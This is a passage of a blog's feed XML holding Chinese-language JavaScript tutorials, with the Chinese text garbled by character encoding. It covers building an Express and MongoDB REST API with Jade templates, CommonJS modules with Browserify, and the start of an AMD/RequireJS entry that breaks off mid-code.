    <content type="html"><![CDATA[<h4 id="åˆ›å»º-package-json"><a href="#åˆ›å»º-package-json" class="headerlink" title="åˆ›å»º package.json"></a>åˆ›å»º package.json</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    <span class="attr">"name"</span>: <span class="string">"express-basis"</span>,</div><div class="line">    <span class="attr">"main"</span>: <span class="string">"service.js"</span>,</div><div class="line">    <span class="attr">"dependencies"</span>: &#123;</div><div class="line">    <span class="attr">"body-parser"</span>: <span class="string">"^1.13.3"</span>,</div><div class="line">    <span class="attr">"express"</span>: <span class="string">"^4.13.3"</span>,</div><div class="line">    <span class="attr">"jade"</span>: <span class="string">"^1.11.0"</span>,</div><div class="line">    <span class="attr">"mongoose"</span>: <span class="string">"^4.1.4"</span>,</div><div class="line">    <span class="attr">"morgan"</span>: <span class="string">"^1.6.1"</span>,</div><div class="line">    <span class="attr">"underscore"</span>: <span class="string">"^1.8.3"</span></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><ul><li>body-parser æ˜¯ä¸ºäº†å–å¾— <code>req.body.param</code>ã€‚</li><li>express æ˜¯æ¡†æ¶ã€‚</li><li>jade æ˜¯æ¸²æŸ“å¼•æ“ã€‚</li><li>mongoose æ“ä½œ <strong>MongoDB</strong>ã€‚</li><li>morgan è¾“å‡ºè®¿é—®ä¿¡æ¯ã€‚</li><li>underscore æ˜¯<strong>ç¥å™¨</strong>ã€‚</li></ul><a id="more"></a><h4 id="ç€æ‰‹-service-js"><a href="#ç€æ‰‹-service-js" class="headerlink" title="ç€æ‰‹ service.js"></a>ç€æ‰‹ service.js</h4><p><code>npm install</code> ä¹‹åï¼Œå¼€å§‹å†™ <code>server.js</code>ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</div><div class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>);</div><div class="line"><span class="keyword">var</span> app = express();</div><div class="line"><span class="keyword">var</span> morgan = <span class="built_in">require</span>(<span class="string">'morgan'</span>);</div><div class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</div><div class="line"><span class="keyword">var</span> jade = <span class="built_in">require</span>(<span class="string">'jade'</span>);</div><div class="line"><span class="keyword">var</span> _ = <span class="built_in">require</span>(<span class="string">'underscore'</span>);</div><div class="line"></div><div class="line">##### ä½¿ç”¨ _morgan_ è¾“å‡ºè®¿é—®ä¿¡æ¯</div><div class="line"></div><div class="line">app.use(morgan(<span class="string">'dev'</span>)); <span class="comment">// log requests to the console</span></div><div class="line"></div><div class="line">##### é…ç½® _body-parser_</div><div class="line"></div><div class="line">app.use(bodyParser.urlencoded(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;));</div><div class="line">app.use(bodyParser.json());</div></pre></td></tr></table></figure><h4 id="è®¾ç½®ç«¯å£"><a href="#è®¾ç½®ç«¯å£" class="headerlink" title="è®¾ç½®ç«¯å£"></a>è®¾ç½®ç«¯å£</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> port = process.env.PORT || <span class="number">2100</span>;</div></pre></td></tr></table></figure><h4 id="è¿æ¥æ•°æ®åº“"><a href="#è¿æ¥æ•°æ®åº“" class="headerlink" title="è¿æ¥æ•°æ®åº“"></a>è¿æ¥æ•°æ®åº“</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> mongoose = <span class="built_in">require</span>(<span class="string">'mongoose'</span>);</div><div class="line">mongoose.connect(<span class="string">'mongodb://127.0.0.1:27017/rest'</span>); <span class="comment">// connect to our database</span></div></pre></td></tr></table></figure><h4 id="æ·»åŠ -middleware-é€šè¿‡-router-use"><a href="#æ·»åŠ -middleware-é€šè¿‡-router-use" class="headerlink" title="æ·»åŠ  middleware é€šè¿‡ router.use"></a>æ·»åŠ  <code>middleware</code> é€šè¿‡ <em>router.use</em></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> router = express.Router();</div><div class="line"></div><div class="line"><span class="comment">// middleware to use for all requests</span></div><div class="line">router.use(<span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</div><div class="line">    <span class="comment">// do logging</span></div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'Something is happening.'</span>);</div><div class="line">    next();</div><div class="line">&#125;);</div></pre></td></tr></table></figure><h4 id="æµ‹è¯•è·¯ç”±"><a href="#æµ‹è¯•è·¯ç”±" class="headerlink" title="æµ‹è¯•è·¯ç”±"></a>æµ‹è¯•è·¯ç”±</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">router.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">    res.json(&#123;<span class="attr">message</span>: <span class="string">'hooray! welcome to our api!'</span>&#125;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><h4 id="æ·»åŠ ä¸€ä¸ª-app-models-bear-js"><a href="#æ·»åŠ ä¸€ä¸ª-app-models-bear-js" class="headerlink" title="æ·»åŠ ä¸€ä¸ª app/models/bear.js"></a>æ·»åŠ ä¸€ä¸ª <code>app/models/bear.js</code></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> mongoose     = <span class="built_in">require</span>(<span class="string">'mongoose'</span>);</div><div class="line"><span class="keyword">var</span> Schema       = mongoose.Schema;</div><div class="line"></div><div class="line"><span class="keyword">var</span> BearSchema   = <span class="keyword">new</span> Schema(&#123;</div><div class="line">    name: <span class="built_in">String</span></div><div class="line">&#125;);</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = mongoose.model(<span class="string">'Bear'</span>, BearSchema);</div></pre></td></tr></table></figure><h4 id="å¾€-MongoDB-æ·»åŠ æ•°æ®å’Œè·å–æ•°æ®"><a href="#å¾€-MongoDB-æ·»åŠ æ•°æ®å’Œè·å–æ•°æ®" class="headerlink" title="å¾€ MongoDB æ·»åŠ æ•°æ®å’Œè·å–æ•°æ®"></a>å¾€ <strong>MongoDB</strong> æ·»åŠ æ•°æ®å’Œè·å–æ•°æ®</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> Bear = <span class="built_in">require</span>(<span class="string">'./app/models/bear'</span>);</div><div class="line"></div><div class="line">router.route(<span class="string">'/bears'</span>)</div><div class="line">    .post(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line"></div><div class="line">        <span class="keyword">var</span> bear = <span class="keyword">new</span> Bear();      <span class="comment">// create a new instance of the Bear model</span></div><div class="line">        bear.name = req.body.name;  <span class="comment">// set the bears name (comes from the request)</span></div><div class="line"></div><div class="line">        bear.save(<span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</div><div class="line">            <span class="keyword">if</span> (err)</div><div class="line">                res.send(err);</div><div class="line"></div><div class="line">            res.json(&#123;<span class="attr">message</span>: <span class="string">'Bear created!'</span>&#125;);</div><div class="line">        &#125;);</div><div class="line"></div><div class="line">    &#125;)</div><div class="line">    .get(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">        Bear.find(<span class="function"><span class="keyword">function</span> (<span class="params">err, bears</span>) </span>&#123;</div><div class="line">            <span class="keyword">if</span> (err)</div><div class="line">                res.send(err);</div><div class="line"></div><div class="line">            res.json(bears);</div><div class="line">        &#125;);</div><div class="line">    &#125;);</div></pre></td></tr></table></figure><h4 id="æ·»åŠ æ•°æ®åº“æœç´¢ã€æ›´æ–°å’Œåˆ é™¤åŠŸèƒ½"><a href="#æ·»åŠ æ•°æ®åº“æœç´¢ã€æ›´æ–°å’Œåˆ é™¤åŠŸèƒ½" class="headerlink" title="æ·»åŠ æ•°æ®åº“æœç´¢ã€æ›´æ–°å’Œåˆ é™¤åŠŸèƒ½"></a>æ·»åŠ æ•°æ®åº“æœç´¢ã€æ›´æ–°å’Œåˆ é™¤åŠŸèƒ½</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">router.route(<span class="string">'/bears/:bear_id'</span>)</div><div class="line"></div><div class="line">    <span class="comment">// get the bear with that id</span></div><div class="line">    .get(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">        Bear.findById(req.params.bear_id, <span class="function"><span class="keyword">function</span> (<span class="params">err, bear</span>) </span>&#123;</div><div class="line">            <span class="keyword">if</span> (err)</div><div class="line">                res.send(err);</div><div class="line">            res.json(bear);</div><div class="line">        &#125;);</div><div class="line">    &#125;)</div><div class="line"></div><div class="line">    <span class="comment">// update the bear with this id</span></div><div class="line">    .put(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">        Bear.findById(req.params.bear_id, <span class="function"><span class="keyword">function</span> (<span class="params">err, bear</span>) </span>&#123;</div><div class="line"></div><div class="line">            <span class="keyword">if</span> (err)</div><div class="line">                res.send(err);</div><div class="line"></div><div class="line">            bear.name = req.body.name;</div><div class="line">            bear.save(<span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</div><div class="line">                <span class="keyword">if</span> (err)</div><div class="line">                    res.send(err);</div><div class="line"></div><div class="line">                res.json(&#123;<span class="attr">message</span>: <span class="string">'Bear updated!'</span>&#125;);</div><div class="line">            &#125;);</div><div class="line"></div><div class="line">        &#125;);</div><div class="line">    &#125;)</div><div class="line">    <span class="comment">// delete the bear with this id</span></div><div class="line">    .delete(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">        Bear.remove(&#123;</div><div class="line">            _id: req.params.bear_id</div><div class="line">        &#125;, <span class="function"><span class="keyword">function</span> (<span class="params">err, bear</span>) </span>&#123;</div><div class="line">            <span class="keyword">if</span> (err)</div><div class="line">                res.send(err);</div><div class="line"></div><div class="line">            res.json(&#123;<span class="attr">message</span>: <span class="string">'Successfully deleted'</span>&#125;);</div><div class="line">        &#125;);</div><div class="line">    &#125;);</div></pre></td></tr></table></figure><h4 id="æ³¨å†Œè·¯ç”±"><a href="#æ³¨å†Œè·¯ç”±" class="headerlink" title="æ³¨å†Œè·¯ç”±"></a>æ³¨å†Œè·¯ç”±</h4><p>æ„å‘³ç€ä¸Šè¿° <code>router</code> æ“ä½œéƒ½æ˜¯åœ¨ <code>/api</code> ä¸‹å®Œæˆçš„</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">app.use(<span class="string">'/api'</span>, router);</div></pre></td></tr></table></figure><h4 id="è®¾ç½®æ¨¡æ¿è·¯å¾„ã€æ¨¡æ¿æ¸²æŸ“å¼•æ“å’Œæ¸²æŸ“é…ç½®"><a href="#è®¾ç½®æ¨¡æ¿è·¯å¾„ã€æ¨¡æ¿æ¸²æŸ“å¼•æ“å’Œæ¸²æŸ“é…ç½®" class="headerlink" title="è®¾ç½®æ¨¡æ¿è·¯å¾„ã€æ¨¡æ¿æ¸²æŸ“å¼•æ“å’Œæ¸²æŸ“é…ç½®"></a>è®¾ç½®æ¨¡æ¿è·¯å¾„ã€æ¨¡æ¿æ¸²æŸ“å¼•æ“å’Œæ¸²æŸ“é…ç½®</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">app.set(<span class="string">'views'</span>, path.join(__dirname + <span class="string">'/views'</span>));</div><div class="line">app.set(<span class="string">'view engine'</span>, <span class="string">'jade'</span>);</div><div class="line"><span class="comment">// é»˜è®¤ä¸º developmentï¼Œç¼–è¯‘ä»£ç ä¸º pretty</span></div><div class="line">app.locals.pretty = app.get(<span class="string">'env'</span>) != <span class="string">'production'</span>;</div></pre></td></tr></table></figure><h4 id="è®¾ç½®é™æ€æ–‡ä»¶è·¯å¾„"><a href="#è®¾ç½®é™æ€æ–‡ä»¶è·¯å¾„" class="headerlink" title="è®¾ç½®é™æ€æ–‡ä»¶è·¯å¾„"></a>è®¾ç½®é™æ€æ–‡ä»¶è·¯å¾„</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">app.use(<span class="string">'/static'</span>, express.static(<span class="string">'public'</span>));</div></pre></td></tr></table></figure><h4 id="è®¾ç½®é¡µé¢æ•°æ®å’Œæ¸²æŸ“æ–‡ä»¶"><a href="#è®¾ç½®é¡µé¢æ•°æ®å’Œæ¸²æŸ“æ–‡ä»¶" class="headerlink" title="è®¾ç½®é¡µé¢æ•°æ®å’Œæ¸²æŸ“æ–‡ä»¶"></a>è®¾ç½®é¡µé¢æ•°æ®å’Œæ¸²æŸ“æ–‡ä»¶</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> data = &#123;</div><div class="line">        title: <span class="string">'Express'</span>,</div><div class="line">        message: <span class="string">'Hello earth!'</span></div><div class="line">    &#125;;</div><div class="line">    res.render(<span class="string">'index'</span>, data);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>ä¸é€‚ç”¨å¼•æ“æ¸²æŸ“æ—¶åˆ™ä½¿ç”¨ <code>res.sendFile</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">res.sendFile(path.join(__dirname + <span class="string">'/view/index'</span>));</div></pre></td></tr></table></figure><h4 id="ç›‘å¬ç«¯å£"><a href="#ç›‘å¬ç«¯å£" class="headerlink" title="ç›‘å¬ç«¯å£"></a>ç›‘å¬ç«¯å£</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">app.listen(port);</div></pre></td></tr></table></figure><h4 id="Jade-æ¨¡æ¿"><a href="#Jade-æ¨¡æ¿" class="headerlink" title="Jade æ¨¡æ¿"></a>Jade æ¨¡æ¿</h4><p><code>views/index.jade</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">doctype html</div><div class="line">html(lang=&apos;en-US&apos;)</div><div class="line">    head</div><div class="line">    meta(charset=&apos;utf-8&apos;)</div><div class="line">    link(rel=&apos;stylesheet&apos;, href=&apos;static/css/bootstrap.min.css&apos;)</div><div class="line">    title #&#123;title&#125;</div><div class="line">    body</div><div class="line">    .container</div><div class="line">        header.jumbotron</div><div class="line">        h1 #&#123;message&#125;</div><div class="line"></div><div class="line">    include common-js</div></pre></td></tr></table></figure><p><code>common-js.jade</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">script(type=&apos;text/javascript&apos;, src=&apos;static/js/jquery.js&apos;)</div><div class="line">script(type=&apos;text/javascript&apos;, src=&apos;static/js/bootstrap.min.js&apos;)</div></pre></td></tr></table></figure><blockquote><p>å»¶ä¼¸é˜…è¯»ï¼š<a href="https://scotch.io/tutorials/build-a-restful-api-using-node-and-express-4" target="_blank" rel="external">Build a RESTful API Using Node and Express 4</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;åˆ›å»º-package-json&quot;&gt;&lt;a href=&quot;#åˆ›å»º-package-json&quot; class=&quot;headerlink&quot; title=&quot;åˆ›å»º package.json&quot;&gt;&lt;/a&gt;åˆ›å»º package.json&lt;/h4&gt;&lt;figure class=&quot;highlight json&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;name&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;express-basis&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;main&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;service.js&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;dependencies&quot;&lt;/span&gt;: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;body-parser&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;^1.13.3&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;express&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;^4.13.3&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;jade&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;^1.11.0&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;mongoose&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;^4.1.4&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;morgan&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;^1.6.1&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;underscore&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;^1.8.3&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;body-parser æ˜¯ä¸ºäº†å–å¾— &lt;code&gt;req.body.param&lt;/code&gt;ã€‚&lt;/li&gt;
&lt;li&gt;express æ˜¯æ¡†æ¶ã€‚&lt;/li&gt;
&lt;li&gt;jade æ˜¯æ¸²æŸ“å¼•æ“ã€‚&lt;/li&gt;
&lt;li&gt;mongoose æ“ä½œ &lt;strong&gt;MongoDB&lt;/strong&gt;ã€‚&lt;/li&gt;
&lt;li&gt;morgan è¾“å‡ºè®¿é—®ä¿¡æ¯ã€‚&lt;/li&gt;
&lt;li&gt;underscore æ˜¯&lt;strong&gt;ç¥å™¨&lt;/strong&gt;ã€‚&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="NodeJS" scheme="http://youngdze.co/categories/NodeJS/"/>
    
    
      <category term="Express" scheme="http://youngdze.co/tags/Express/"/>
    
  </entry>
  
  <entry>
    <title>CommonJS åŸºç¡€</title>
    <link href="http://youngdze.co/2015/08/31/commonjs-basis/"/>
    <id>http://youngdze.co/2015/08/31/commonjs-basis/</id>
    <published>2015-08-31T13:41:36.000Z</published>
    <updated>2016-12-05T04:55:42.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>CommonJS</strong> è¢«è®¾è®¡æ¥é’ˆå¯¹æœåŠ¡ç«¯ï¼Œä¸è¿‡ç°åœ¨å¯ä»¥é€šè¿‡ <strong><a href="http://browserify.org/" target="_blank" rel="external">Browserify</a></strong> è½¬å˜ç»™å®¢æˆ·ç«¯ä½¿ç”¨ï¼Œå¦‚æœ‰è¿™æ–¹é¢çš„éœ€æ±‚ï¼Œæ›´å»ºè®®ä½¿ç”¨ <strong><a href="http://webpack.github.io/" target="_blank" rel="external">webpack</a></strong>ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">browserify .\main.js .\foo.js -o .\bundle.js</div></pre></td></tr></table></figure><a id="more"></a><p><strong>å®‰è£…æ¨¡å—</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install uniq</div></pre></td></tr></table></figure><p><strong>å®šä¹‰æ¨¡å—</strong> <code>foo.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> foo = <span class="function"><span class="keyword">function</span> (<span class="params">arr</span>) </span>&#123;</div><div class="line">    arr.reverse();</div><div class="line">    <span class="built_in">console</span>.log(arr);</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = foo;</div></pre></td></tr></table></figure><p><strong>ä½¿ç”¨æ¨¡å—</strong> <code>main.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> unique = <span class="built_in">require</span>(<span class="string">'uniq'</span>);</div><div class="line"><span class="keyword">var</span> foo = <span class="built_in">require</span>(<span class="string">'./foo.js'</span>);</div><div class="line"><span class="keyword">var</span> data = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">0</span>];</div><div class="line">foo(data);</div><div class="line"><span class="built_in">console</span>.log(unique(data));</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;CommonJS&lt;/strong&gt; è¢«è®¾è®¡æ¥é’ˆå¯¹æœåŠ¡ç«¯ï¼Œä¸è¿‡ç°åœ¨å¯ä»¥é€šè¿‡ &lt;strong&gt;&lt;a href=&quot;http://browserify.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Browserify&lt;/a&gt;&lt;/strong&gt; è½¬å˜ç»™å®¢æˆ·ç«¯ä½¿ç”¨ï¼Œå¦‚æœ‰è¿™æ–¹é¢çš„éœ€æ±‚ï¼Œæ›´å»ºè®®ä½¿ç”¨ &lt;strong&gt;&lt;a href=&quot;http://webpack.github.io/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;webpack&lt;/a&gt;&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;browserify .\main.js .\foo.js -o .\bundle.js&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="JavaScript" scheme="http://youngdze.co/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>AMD å’Œ RequireJS</title>
    <link href="http://youngdze.co/2015/08/31/amd-and-requirejs/"/>
    <id>http://youngdze.co/2015/08/31/amd-and-requirejs/</id>
    <published>2015-08-31T12:35:11.000Z</published>
    <updated>2016-12-05T11:40:32.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æ‘˜å½•è‡ªï¼š<a href="https://code.tutsplus.com/tutorials/next-generation-javascript-with-amd-and-requirejs--net-21596" target="_blank" rel="external">Next Generation JavaScript with AMD and RequireJS</a></p></blockquote><h3 id="ä¸ºäº†è§£å†³çš„é—®é¢˜"><a href="#ä¸ºäº†è§£å†³çš„é—®é¢˜" class="headerlink" title="ä¸ºäº†è§£å†³çš„é—®é¢˜"></a>ä¸ºäº†è§£å†³çš„é—®é¢˜</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"file1.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"file2.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"file3.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure><a id="more"></a><h3 id="å¼‚æ­¥æ¨¡å—å®šä¹‰-Asynchronous-Module-Definition-as-AMD"><a href="#å¼‚æ­¥æ¨¡å—å®šä¹‰-Asynchronous-Module-Definition-as-AMD" class="headerlink" title="å¼‚æ­¥æ¨¡å—å®šä¹‰ (Asynchronous Module Definition as AMD)"></a>å¼‚æ­¥æ¨¡å—å®šä¹‰ (Asynchronous Module Definition as AMD)</h3><p><code>dom/events.js</code> å®šä¹‰æ¨¡å—</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">define(&#123;</div><div class="line">    addEvent: <span class="function"><span 